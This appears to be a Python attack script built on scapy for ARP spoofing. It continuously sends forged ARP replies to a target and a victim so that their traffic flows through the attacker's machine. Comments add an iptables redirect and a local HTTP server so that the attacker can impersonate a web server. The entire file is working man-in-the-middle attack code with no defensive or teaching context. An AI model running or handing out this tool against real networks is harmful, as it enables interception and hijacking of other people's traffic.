#!/usr/bin/env python
from scapy.all import *

ip_target = "X.X.X.X"
ip_victim = "X.X.X.X"

#to spoof an http serv :
#
#on hacker:
#
#iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 6673
#
#and 
#
#python3 -m http.server 6673

def spoffing(target, victim):
    packet = ARP(op=2, pdst=target, psrc=victim)
    send(packet, iface='eth1')

if __name__ == '__main__':
   try:
        while True:
            spoffing(ip_target,ip_victim)
            spoffing(ip_victim,ip_target)
            #time.sleep(1)
   except KeyboardInterrupt:
        quit()
